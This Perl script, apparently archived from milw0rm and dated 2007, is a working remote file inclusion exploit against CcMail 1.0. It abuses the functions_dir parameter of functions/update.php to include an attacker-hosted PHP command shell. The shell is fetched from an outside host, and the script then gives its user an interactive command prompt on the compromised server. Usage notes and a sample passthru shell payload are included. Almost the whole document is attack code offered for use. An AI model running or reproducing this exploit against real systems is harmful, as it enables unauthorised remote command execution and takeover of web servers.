#!/usr/bin/perl
########################################################################################################
#  CcMail 1.0 Remote  File Inclusion Exploit
########################################################################################################
# Download Script http://www.cicoandcico.com/download/ccmail/ccmail_1.0.1.tar.gz
########################################################################################################
# Bug Found & coded By Crackers_Child
#########################################################################################################
# localexploit@hotmail.com
#########################################################################################################
# Kullanimi
# perl cra.pl <target> <cmd shell location> <cmd shell variable>
#
# perl cra.pl http://site.com/ http://site.com/cmd.txt cmd
#
# cmd shell example: <?passthru($_GET[cmd]);?>
#
# cmd shell variable: ($_GET[cmd]);
##
# #
#Greetz:My Friends And Enemies ;) ;) Puhaha [Millet Got Olmus Aq ]
#
# Contact: crackers_child@sibersavascilar.com
##

use LWP::UserAgent;

$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];

if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}

head();

while()
{
      print "[shell] \$";
while(<STDIN>)
      {
              $cmd=$_;
              chomp($cmd);

$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Path.'functions/update.php?functions_dir='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";

$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[....]/;

if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}

elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
      {print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}

if($return =~ /(.*)/)


{
      $finreturn = $1;
      $finreturn=~ tr/[....]/[\n]/;
      print "\r\n$finreturn\n\r";
      last;
}

else {print "[shell] \$";}}}last;

sub head()
 {
 print "\n============================================================================\r\n";
 print " *                CcMail 1.0 Remote  File Inclusion Exploit*\r\n";
 print "============================================================================\r\n";
 }
sub usage()
 {
 head();
 print " Usage: perl cra <target> <cmd shell location> <cmd shell variable>\r\n\n";
 print " <Site> - Full path to example: http://www.site.com/ \r\n";
 print " <cmd shell> - Path to cmd Shell e.g http://sibersavascilar.com/rst.txt? \r\n";
 print " <cmd variable> - Command variable used in php shell \r\n";
 print "============================================================================\r\n";
 print "                             By Crackers_Child \r\n";
 print "                   localexploit(at)hotmail(dot)com \r\n";
 print "============================================================================\r\n";
 exit();
 }

# milw0rm.com [2007-03-15]
